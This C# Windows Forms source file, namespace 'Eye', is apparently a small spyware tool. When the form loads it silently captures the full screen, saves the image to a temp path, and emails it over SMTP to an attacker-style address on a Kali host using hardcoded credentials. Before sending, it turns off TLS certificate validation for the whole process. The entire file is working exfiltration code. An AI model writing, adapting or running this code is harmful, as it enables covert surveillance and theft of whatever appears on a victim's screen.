using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eye
{
    public partial class Form1 : Form
    {

        private static string FILE_PATH = "C:/tmp/image.jpeg";
        private static string RECIPIENT = "alienum@kali.local";
        private static string MAIL_SUBJECT = "screenshot";
        private static string MAIL_BODY = "ouch";

        private static string SMTP_CLIENT = "MAIL_SERVER_IP_";
        private static int SMTP_PORT = 25;
        private static string USERNAME = "alienum@kali.local";
        private static string PASSWORD = "alienum";

        public Form1()
        {
            InitializeComponent();
        }

        public static string Screenshot()
        {
            string path = string.Empty;
            try
            {

                //print the screen
                Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics graphics = Graphics.FromImage(printscreen as Image);
                graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);
                path = FILE_PATH;
                printscreen.Save(path, ImageFormat.Jpeg);

                //Send the mail with attachment
                MailMessage mm = new MailMessage();
                mm.From = new MailAddress(USERNAME);
                mm.To.Add(RECIPIENT);

                mm.Subject = MAIL_SUBJECT;
                mm.Body = MAIL_BODY;

                mm.IsBodyHtml = true;

                Attachment att = new Attachment(path, MediaTypeNames.Image.Jpeg);
                mm.Attachments.Add(att);

                sendEmail(mm);

                mm.Dispose();
            }
            catch (Exception ex)
            {
                throw ex;
            }

            return path;
        }

        private static void sendEmail(MailMessage mm)
        {

            var client = new SmtpClient(SMTP_CLIENT, SMTP_PORT)
            {
                Credentials = new NetworkCredential(USERNAME, PASSWORD),
                EnableSsl = true
            };

            NEVER_EAT_POISON_Disable_CertificateValidation();
            client.Send(mm);

            client.Dispose();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            Screenshot();

        }

        //[Obsolete("Do not use this in Production code!!!", true)]
        static void NEVER_EAT_POISON_Disable_CertificateValidation()
        {
            // Disabling certificate validation can expose you to a man-in-the-middle attack
            // which may allow your encrypted message to be read by an attacker
            // https://stackoverflow.com/a/14907718/740639
            ServicePointManager.ServerCertificateValidationCallback =
                delegate (
                    object s,
                    X509Certificate certificate,
                    X509Chain chain,
                    SslPolicyErrors sslPolicyErrors
                ) {
                    return true;
                };
        }

    }
}
